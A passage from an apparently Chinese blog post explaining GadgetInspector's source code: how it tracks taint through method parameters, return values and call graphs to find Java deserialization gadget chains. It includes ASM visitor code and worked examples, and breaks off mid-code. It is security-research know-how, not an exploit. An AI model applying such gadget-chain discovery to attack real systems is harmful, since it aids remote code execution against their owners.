<p>接下来，将待分析方法所调用的所有方法集合都取出来，这里可以说是子方法集合outgoingReferences。</p>
<p>之后开始遍历子方法集合，取出每一个子方法作为参数，开始迭代</p>
<p>这其实就是DFS，当到达一个叶子结点的时候，由于没有子方法，就不会进入到循环，也就不会再次递归。</p>
<p>这时就会弹出栈顶元素，也就是叶子结点，加入到visitedNodes和sortedMethods里面。</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201120100545146.png" alt="image-20201120100545146"></p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201120100601500.png" alt="image-20201120100601500"></p>
<h3 id="生成passthrough数据流图"><a href="#生成passthrough数据流图" class="headerlink" title="生成passthrough数据流图"></a>生成passthrough数据流图</h3><p>在calculatePassthroughDataflow中遍历了sortedmethods，并通过字节码分析，生成了方法返回值与参数关系的passthrough数据流。注意到下面的序列化决定器，作者内置了三种：JDK、Jackson、Xstream，会根据具体的序列化决定器判定决策过程中的类是否符合对应库的反序列化要求，不符合的就跳过：</p>
<ul>
<li>对于JDK(ObjectInputStream)，类否继承了Serializable接口</li>
<li>对于Jackson，类是否存在0参构造器</li>
<li>对于Xstream，类名能否作为有效的XML标签</li>
</ul>
<p>生成passthrough数据流代码：</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201120104511218.png" alt="image-20201120104511218"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br></pre></td></tr></table></figure>

<p>首先passthroughDataflow主要负责的是存储参数污染结果，key对应方法名，value对应的是可以污染下去的参数索引集合。</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201130145525684.png" alt="image-20201130145525684"></p>
<p>接下来，遍历经历过拓扑排序过的方法；</p>
<p>首先第一步会跳过静态初始化代码，因为静态代码块基本上是没法被污染的，直接在类加载阶段就会执行。</p>
<p>第二步在遍历的每个方法过程中，获取它所属的类，对其进行ASM访问者模式的分析：</p>
<p>跟进PassthroughDataflowClassVisitor中分析，重点还是在visitMethod方法中</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201130150835717.png" alt="image-20201130150835717"></p>
<p>是这样的，对于每一个类中对的每一个方法都会经历PassthroughDataflowClassVisitor这一步。对于类中的每一个方法都会进行它的方法（例如visit，visitMethod），对于每一个方法都会在visitMethod里面走一遭。</p>
<p>那么对于ASM在观察到每一个方法都会执行visitMethod方法，通过<strong>此处重新判断所观察的方法是不是我们想找、所关心的方法</strong>，只有我们关心的方法才能继续下去，进入PassthroughDataflowMethodVisitor继续观察。</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201130154509973.png" alt="image-20201130154509973"></p>
<p>继续跟进PassthroughDataflowMethodVisitor，可以看到，它继承了TaintTrackingMethodVisitor，并有以下几个方法的实现：</p>
<ol>
<li>visitCode：在进入方法的第一时间，ASM会先调用这个方法</li>
<li>visitInsn：在方法体中，每一个字节码操作指令的执行，ASM都会调用这个方法，return</li>
<li>visitFieldInsn：对于字段的调用，ASM都会调用这个方法</li>
<li>visitMethodInsn：方法体内，一旦调用了其他方法，都会触发这个方法的调用</li>
</ol>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201130154944412.png" alt="image-20201130154944412"></p>
<p>还有一个父类中的方法：</p>
<p>visitVarInsn：这个方法在方法体内进行字节码操作变量时，会被调用。</p>
<p>为了实现类似污点分析，去分析参数对方法的污染，其模仿了jvm，实现了两个集合，分别是本地变量表和操作数栈，通过其，实现具体的污点分析，那么具体是怎么进行的呢？</p>
<p>这里写一下具体细节：</p>
<p>visitCode-&gt;gadgetinspector.TaintTrackingMethodVisitor#visitVarInsn(在父类里面)-&gt;visitInsn更新污染表-&gt;gadgetinspector.PassthroughDiscovery#calculatePassthroughDataflow</p>
<p>这里需要跟一下gadgetinspector的逻辑：</p>
<p>首先：</p>
<p>本地变量表：List&lt;Set<T>&gt; localVars;</T></p>
<p>操作数栈：List&lt;Set<T>&gt; stackVars;</T></p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210316195921976.png" alt="image-20210316195921976"></p>
<p>这里借鉴一下<a href="https://xz.aliyun.com/t/7058" target="_blank" rel="noopener">threedr3am</a>的例子：</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201130160432170.png" alt="image-20201130160432170"></p>
<p>逆拓扑结果：</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201130160447220.png" alt="image-20201130160447220"></p>
<p>按照这个例子来分析：</p>
<ul>
<li><p>A.method1:</p>
<p>第一步，ASM对A.method1进行观察，也就是PassthroughDataflowMethodVisitor进行观察，那么，在其方法被执行开始的时候，会触发PassthroughDataflowMethodVisitor.visitCode方法的调用，在这一步的代码中，会首先对方法是否是static方法等进行判断，接着做了一个操作，就是把入参放到了本地变量表中来，为什么要这样做呢？我们可以想象一下，一个方法内部，能用到的数据要不就是本地变量表的数据，要不就是通过字段调用的数据，那么，在分析调用其他方法，或者对返回值是否会被入参污染时的数据流动，都跟它紧密关联，为什么这样说？根据jvm字节码的操作，<strong>在调用方法前，肯定需要对相关参数进行入栈</strong>，那入栈的数据从哪里来，必然就是本地变量表或者其他字段(这里的其他字段估计是其他方法的返回值)。那么在形成这样的一个本地变量表之后，就能标识一个方法内部的数据流动，并最终确定污染结果。</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210318193555532.png" alt="image-20210318193555532"></p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210318193611196.png" alt="image-20210318193611196"></p>
</li>
</ul>
<p>  上面的这步savedVariableState.localVars.set(index, values);其实就是在局部变量表里面更新索引。</p>
<p>  第二步，这里三梦师傅写得很乱，仔细查了一下，visitVarInsn是访问局部变量指令。 局部变量指令是加载loads或存储stores局部变量值的指令。也就是说出现这些<em>ILOAD, LLOAD, FLOAD, DLOAD, ALOAD, ISTORE, LSTORE, FSTORE, DSTORE, ASTORE or RET.</em>指令的时候，可以触发这个方法。</p>
<p>  <img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210318195425611.png" alt="image-20210318195425611"></p>
<p>  这里继续跟，该到new A().method1(args)调用，JVM会执行指令aload1（将局部变量表1号位置的元素入栈）对其参数args进行入栈，因为args是引用类型，那么操作代码就是Opcodes.ALOAD1，可以看到，代码中，从本地变量表获取了变量索引，并放入到操作数栈中来。</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitVarInsn</span><span class="params">(<span class="keyword">int</span> opcode, <span class="keyword">int</span> <span class="keyword">var</span>)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// Extend local variable state to make sure we include the variable index</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = savedVariableState.localVars.size(); i &lt;= <span class="keyword">var</span>; i++) &#123;</span><br><span class="line">            savedVariableState.localVars.add(<span class="keyword">new</span> HashSet&lt;T&gt;());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Set&lt;T&gt; saved0;</span><br><span class="line">        <span class="keyword">switch</span>(opcode) &#123;</span><br><span class="line">            <span class="keyword">case</span> Opcodes.ILOAD:</span><br><span class="line">            <span class="keyword">case</span> Opcodes.FLOAD:</span><br><span class="line">                push();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> Opcodes.LLOAD:</span><br><span class="line">            <span class="keyword">case</span> Opcodes.DLOAD:</span><br><span class="line">                push();</span><br><span class="line">                push();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> Opcodes.ALOAD:</span><br><span class="line">                push(savedVariableState.localVars.get(<span class="keyword">var</span>));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> Opcodes.ISTORE:</span><br><span class="line">            <span class="keyword">case</span> Opcodes.FSTORE:</span><br><span class="line">                pop();</span><br><span class="line">                savedVariableState.localVars.set(<span class="keyword">var</span>, <span class="keyword">new</span> HashSet&lt;T&gt;());</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> Opcodes.DSTORE:</span><br><span class="line">            <span class="keyword">case</span> Opcodes.LSTORE:</span><br><span class="line">                pop();</span><br><span class="line">                pop();</span><br><span class="line">                savedVariableState.localVars.set(<span class="keyword">var</span>, <span class="keyword">new</span> HashSet&lt;T&gt;());</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> Opcodes.ASTORE:</span><br><span class="line">                saved0 = pop();</span><br><span class="line">                savedVariableState.localVars.set(<span class="keyword">var</span>, saved0);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> Opcodes.RET:</span><br><span class="line">                <span class="comment">// No effect on stack</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Unsupported opcode: "</span> + opcode);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>  <img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210318195552582.png" alt="image-20210318195552582"></p>
<p>  第三步，这时则需要areturn，弹出操作数栈。执行了areturn方法，那么就会触发visitInsn这个方法，因为返回的是引用类型，那么相应的指令就是Opcodes.ARETURN，可以看到，在这个case中，会从栈顶，获取刚刚入栈（第二步中visitVarInsn从本地变量表获取的参数索引）的参数索引，并存储到returnTaint中，因此，即<strong>表示A.method1这个方法的调用，参数索引为1的参数param会污染返回值</strong>。</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitInsn</span><span class="params">(<span class="keyword">int</span> opcode)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(opcode) &#123;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.IRETURN:<span class="comment">//从当前方法返回int</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.FRETURN:<span class="comment">//从当前方法返回float</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.ARETURN:<span class="comment">//从当前方法返回对象引用</span></span><br><span class="line">            returnTaint.addAll(getStackTaint(<span class="number">0</span>));<span class="comment">//栈空间从内存高位到低位分配空间</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.LRETURN:<span class="comment">//从当前方法返回long</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.DRETURN:<span class="comment">//从当前方法返回double</span></span><br><span class="line">            returnTaint.addAll(getStackTaint(<span class="number">1</span>));</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.RETURN:<span class="comment">//从当前方法返回void</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">super</span>.visitInsn(opcode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Set&lt;T&gt; <span class="title">getStackTaint</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//出栈，index=0为栈顶</span></span><br><span class="line">        <span class="keyword">return</span> savedVariableState.stackVars.get(savedVariableState.stackVars.size()-<span class="number">1</span>-index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Set&lt;Integer&gt; returnTaint;<span class="comment">//被污染的返回数据</span></span><br></pre></td></tr></table></figure>

<p>  第四步，经过return之后，该方法的观察也就结束了，那么，回到gadgetinspector.PassthroughDiscovery#calculatePassthroughDataflow中，对于刚刚放到returnTaint污点分析结果，也会在其方法中，缓存到passthroughDataflow。</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassReader cr = <span class="keyword">new</span> ClassReader(inputStream);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    PassthroughDataflowClassVisitor cv = <span class="keyword">new</span> PassthroughDataflowClassVisitor(classMap, inheritanceMap,</span><br><span class="line">            passthroughDataflow, serializableDecider, Opcodes.ASM6, method);</span><br><span class="line">    cr.accept(cv, ClassReader.EXPAND_FRAMES);</span><br><span class="line">    passthroughDataflow.put(method, cv.getReturnTaint());<span class="comment">//缓存方法返回值与哪个参数有关系</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    LOGGER.error(<span class="string">"Exception analyzing "</span> + method.getClassReference().getName(), e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li><p>C.method3:</p>
<p>同method1</p>
</li>
<li><p>B.method2:</p>
<p>先看method2字节码：</p>
<img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210318203426098.png" alt="image-20210318203426098" style="zoom:80%;">

<p>这个方法和前面连个都不一样，它内部调用了C.method3方法，因此，污点分析时，具体的细节就又不一样了：</p>
<p>第一步，在其方法被执行开始的时候，同样会触发PassthroughDataflowMethodVisitor.visitCode方法的调用，在其中，也是做了相应的操作，把入参存到了本地变量表中来；</p>
<p>第二步，因为方法内部即将调用C.method3，那么ASM调用visitVarInsn方法，对其参数param进行入栈，因为param是引用类型，那么操作代码就是Opcodes.ALOAD，因此，从第一步保存的本地变量表中获取变量入栈；</p>
<p>这里仔细看，method2 准备调用method3时的状态：</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210318210935086.png" alt="image-20210318210935086"></p>
<p>在ALOAD_1这一步之后，localvars=(0.0;1.1);stackVars=(0.0;1.1);</p>
<p>第三步，方法内部调用了C.method3，那么，ASM就会触发visitMethodInsn方法的执行，在这一步，会先对被调用方法的入参进行处理，<strong>并把被调用方法的实例放到argTypes的第一个索引位置</strong>，后面依次放置其他参数，接着计算返回值大小。然后，因为方法调用，第二步已经把参数入栈stack了，而这些参数都是从本地变量表获取的，那么，可以从栈顶取到相关参数，并认为这些参数是可被控制，也就是被当前调用者caller方法污染的。</p>
<p>这里进入visitMethodInsn方法具体看一下：</p>
<img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210318222907723.png" alt="image-20210318222907723" style="zoom:50%;">

<p>执行到这里，argTypes存放的是（Cthis，String）</p>
</li>
</ul>
<p>  最后，也就是最重点的一步，从passthroughDataflow中获取了被调用方法的参数污染结果，也就是上一个方法C.method3方法被分析时候，return存储的数据，所以，这里就印证了前面为什么要使用逆拓扑排序，因为如果不这样做的话，C.method3可能在B.method2后被分析，那么，缓存就不可能存在污点分析的结果，那么就没办法对B.method2进行正确的污点分析。接着就是对从缓存取出的污染结果和入参对比，取出相应索引的污点参数，放入到resultTaint中。</p>
<p>  gadgetinspector.TaintTrackingMethodVisitor#visitMethodInsn</p>
<ul>
<li><p>main:  最后需要分析的是main方法的入参args是否会污染到其返回值</p>
<p>第一步，执行visitCode存储入参到本地变量表</p>
<p>第二步，执行visitVarInsn参数入栈</p>
<p>第三步，执行visitMethodInsn调用A.method1，A.method1被污染的返回结果，也就是参数索引会被放在栈顶</p>
<p>第四步，执行visitVarInsn把放在栈顶的污染参数索引，放入到本地变量表</p>
<p>第五步，执行visitVarInsn参数入栈</p>
<p>第六步，执行visitMethodInsn调用B.method2，被污染的返回结果会被放在栈顶</p>
<p>第七步，执行visitInsn，返回栈顶数据，缓存到passthroughDataflow，也就是main方法的污点分析结果</p>
<p>到此，ASM实现方法入参污染返回值的分析就到此为止了。</p>
<p>接下来，passthroughDiscovery.save方法就被调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (passthroughDataflow == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Save called before discover()"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DataLoader.saveData(Paths.get(<span class="string">"passthrough.dat"</span>), <span class="keyword">new</span> PassThroughFactory(), passthroughDataflow.entrySet());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也是通过DataLoader.saveData把结果一行一行的保存到passthrough.dat文件中，而每行数据的序列化，是通过PassThroughFactory实现</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201130172722782.png" alt="image-20201130172722782"></p>
<p>最终，这一阶段分析保存下来passthrough.dat文件的数据格式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">类名 方法名 方法描述 能污染返回值的参数索引<span class="number">1</span>,能污染返回值的参数索引<span class="number">2</span>,能污染返回值的参数索引<span class="number">3</span>...</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="方法调用探索-CallGraphDiscovery"><a href="#方法调用探索-CallGraphDiscovery" class="headerlink" title="方法调用探索 CallGraphDiscovery"></a>方法调用探索 CallGraphDiscovery</h2><p>这一步和上一步类似，gadgetinspector 会再次扫描全部的Java方法，但检查的不再是参数与返回结果的关系，而是<strong>方法的参数与其所调用的子方法的关系，即子方法的参数是否可以被父方法的参数所影响</strong>。</p>
<p>看下面这个<a href="https://paper.seebug.org/1034/#step2-passthrough" target="_blank" rel="noopener">例子</a>：</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210316211044098.png" alt="image-20210316211044098"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">调用者类名 调用者方法caller 调用者方法描述 被调用者类名 被调用者方法target 被调用者方法描述 调用者方法参数索引 调用者字段名 被调用者方法参数索引</span><br><span class="line">Main (Ljava/lang/String;)<span class="function">V main A <span class="title">method1</span> <span class="params">(Ljava/lang/String;)</span>Ljava/lang/String</span>; <span class="number">1</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>先看作者给出的例子：</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210316212942997.png" alt="image-20210316212942997"></p>
<p>1/AbstractTableModel$ff19274a.hashcode与子方法IFn.invoke：</p>
<ul>
<li>AbstractTableModel$ff19274a.hashcode的this(0参)传递给了IFn.invoke的1参，0-&gt;IFn.invoke()@1</li>
<li>这里f是通过this._clojureFnMap(0参)获得的，并且f又作为IFn.invoke()的this(也是0参)，换句话说：AbstractTableModel$ff19274a.hashcode的0参传递给了IFn.invoke的零参，表示为0-&gt;IFn.invoke()@0</li>
</ul>
<p>2/FnCompose.invoke与子方法IFn.invoke：</p>
<ul>
<li>首先先看最里面，f1.invoke(arg)的参数arg为IFn.invoke(Object arg)的参数 都是1参 所以 1-&gt;IFn.invoke()@1 </li>
<li>第二层，f1.invoke(arg)里面的f1，是FnCompose的类属性 属于0参 在f1.invoke(arg)里面也是this，所以0-&gt;IFn.invoke()@0</li>
<li>第三层，f2.invoke(f1.invoke(arg))，这里面 f1.invoke(arg)按道理是作为1参，但是对于f1反序列化来说，我们可以控制具体是IFn的哪个实现类，所以这里f1.invoke(arg)也可以看成是0参(一种合理的风险推测)，所以是0-&gt;IFn.invoke()@1</li>
</ul>
<p>具体看源码</p>
<p>discover-&gt;ModelGeneratorClassVisitor</p>
<p>直接跟gadgetinspector.CallGraphDiscovery#discover：</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201201093433260.png" alt="image-20201201093433260"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//加载所有方法信息</span></span><br><span class="line">Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();</span><br><span class="line"><span class="comment">//加载所有类信息</span></span><br><span class="line">Map&lt;ClassReference.Handle, ClassReference&gt; classMap = DataLoader.loadClasses();</span><br><span class="line"><span class="comment">//加载所有父子类、超类、实现类关系</span></span><br><span class="line">InheritanceMap inheritanceMap = InheritanceMap.load();</span><br><span class="line"><span class="comment">//加载所有方法参数和返回值的污染关联</span></span><br><span class="line">Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow = PassthroughDiscovery.load();</span><br></pre></td></tr></table></figure>

<p>接着遍历每一个class，并对其使用ASM进行观察：</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201201094123852.png" alt="image-20201201094123852"></p>
<p>ModelGeneratorClassVisitor实现主要就是对每一个方法都进行了ASM的观察：</p>
<p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201201095156174.png" alt="image-20201201095156174"></p>
<p>ModelGeneratorMethodVisitor的实现，是这一步的重点逻辑所在，因为单单文字描述可能理解不太清楚，这边继续以<a href="https://xz.aliyun.com/t/7058" target="_blank" rel="noopener">一个例子</a>进行讲解：</p>
<img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210319000648951.png" alt="image-20210319000648951" style="zoom:50%;">

<p>可以看到上述例子中，Main的main方法中，调用了A.method1方法，并且入参是main的参数args以及Main的字段name</p>
<p>ASM的实现流程：</p>
<ul>
<li>在Main.main方法体被观察到的第一时间，ASM会调用ModelGeneratorMethodVisitor.visitCode，在这个方法中，根据参数的数量，一一形成名称arg0、arg1…，然后放入到本地变量表，本地变量表现在是0:arg0，1:args;</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.visitCode();</span><br><span class="line">    <span class="keyword">int</span> localIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> argIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//使用arg前缀来表示方法入参，后续用于判断是否为目标调用方法的入参</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">this</span>.access &amp; Opcodes.ACC_STATIC) == <span class="number">0</span>) &#123;</span><br><span class="line">        setLocalTaint(localIndex, <span class="string">"arg"</span> + argIndex);</span><br><span class="line">        localIndex += <span class="number">1</span>;</span><br><span class="line">        argIndex += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (Type argType : Type.getArgumentTypes(desc)) &#123;</span><br><span class="line">        setLocalTaint(localIndex, <span class="string">"arg"</span> + argIndex);</span><br><span class="line">        localIndex += argType.getSize();</span><br><span class="line">        argIndex += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>接着，因为即将要调用A.method1，ASM会调用visitVarInsn，先是aload_1将本地变量表中1号索引args入栈，然后aload_0将arg0入栈。</li>
</ul>
<img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201201101122436.png" alt="image-20201201101122436" style="zoom:50%;">

<ul>
<li><p>然后，ASM调用visitVarInsn把当前实例对应的参数入栈，上一步visitCode已经把实例命名为arg0存在本地变量表中，因此入栈的参数名称为arg0，接下来会执行getfield指令，对应调用ASM内部的visitFieldInsn获取字段name，并命名为arg0.name入栈。这里详细说一下，作者这里判断了字段是否是transient的。</p>
<blockquote>
<p>transient修饰符通常用于在那些实现了序列化接口的类中，不想被序列化的field。</p>
<p>一旦被transient修饰过后的变量，该变量内容在序列化后无法获得访问。</p>
</blockquote>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">                <span class="keyword">case</span> Opcodes.GETSTATIC:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> Opcodes.PUTSTATIC:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> Opcodes.GETFIELD:</span><br><span class="line">                    Type type = Type.getType(desc);<span class="comment">//获取字段类型</span></span><br><span class="line">                    <span class="keyword">if</span> (type.getSize() == <span class="number">1</span>) &#123;</span><br><span class="line">                        <span class="comment">//size=1可能为引用类型</span></span><br><span class="line">                        Boolean isTransient = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// If a field type could not possibly be serialized, it's effectively transient</span></span><br><span class="line">                        <span class="comment">//判断调用的字段类型是否可序列化</span></span><br><span class="line">                        <span class="keyword">if</span> (!couldBeSerialized(serializableDecider, inheritanceMap, <span class="keyword">new</span> ClassReference.Handle(type.getInternalName()))) &#123;</span><br><span class="line">                            isTransient = Boolean.TRUE;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="comment">//若调用的字段可被序列化，则取当前类实例的所有字段，找出调用的字段，去判断是否被标识了transient</span></span><br><span class="line">                            ClassReference clazz = classMap.get(<span class="keyword">new</span> ClassReference.Handle(owner));</span><br><span class="line">                            <span class="keyword">while</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                                <span class="comment">//遍历字段，判断是否是transient类型，以确定是否可被序列化</span></span><br><span class="line">                                <span class="keyword">for</span> (ClassReference.Member member : clazz.getMembers()) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> (member.getName().equals(name)) &#123;</span><br><span class="line">                                        isTransient = (member.getModifiers() &amp; Opcodes.ACC_TRANSIENT) != <span class="number">0</span>;</span><br><span class="line">                                        <span class="keyword">break</span>;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">if</span> (isTransient != <span class="keyword">null</span>) &#123;</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="comment">//若找不到字段，则向上父类查找，继续遍历</span></span><br><span class="line">                                clazz = classMap.get(<span class="keyword">new</span> ClassReference.Handle(clazz.getSuperClass()));</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        Set&lt;Integer&gt; taint;</span><br><span class="line">                        <span class="keyword">if</span> (!Boolean.TRUE.equals(isTransient)) &#123;</span><br><span class="line">                            <span class="comment">//若不是Transient字段，则从栈顶取出它，取出的是this或某实例变量，即字段所属实例</span></span><br><span class="line">                            taint = getStackTaint(<span class="number">0</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            taint = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">super</span>.visitFieldInsn(opcode, owner, name, desc);</span><br><span class="line">                        <span class="comment">//在调用方法前，都会先入栈，作为参数</span></span><br><span class="line">                        setStackTaint(<span class="number">0</span>, taint);</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210319103128715.png" alt="image-20210319103128715" style="zoom:80%;">

<ul>
<li>getfield之后，就是调用method1方法，对应的JVM指令是invokevirtual，所以ASM调用visitMethodInsn，因为Main.main调用了A.method1，在这里个环境，清楚的用代码解释了为什么前面需要把参数命名为arg0、arg1、arg0.name这样，因为需要通过这样的一个字符串名称，和被调用方法的入参进行关联，并最终形成调用者和被调用者直接的参数关联。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitMethodInsn</span><span class="params">(<span class="keyword">int</span> opcode, String owner, String name, String desc, <span class="keyword">boolean</span> itf)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//获取被调用method的参数和类型，非静态方法需要把实例类型放在第一个元素</span></span><br><span class="line">    Type[] argTypes = Type.getArgumentTypes(desc);</span><br><span class="line">    <span class="keyword">if</span> (opcode != Opcodes.INVOKESTATIC) &#123;</span><br><span class="line">        Type[] extendedArgTypes = <span class="keyword">new</span> Type[argTypes.length+<span class="number">1</span>];</span><br><span class="line">        System.arraycopy(argTypes, <span class="number">0</span>, extendedArgTypes, <span class="number">1</span>, argTypes.length);</span><br><span class="line">        extendedArgTypes[<span class="number">0</span>] = Type.getObjectType(owner);</span><br><span class="line">        argTypes = extendedArgTypes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">        <span 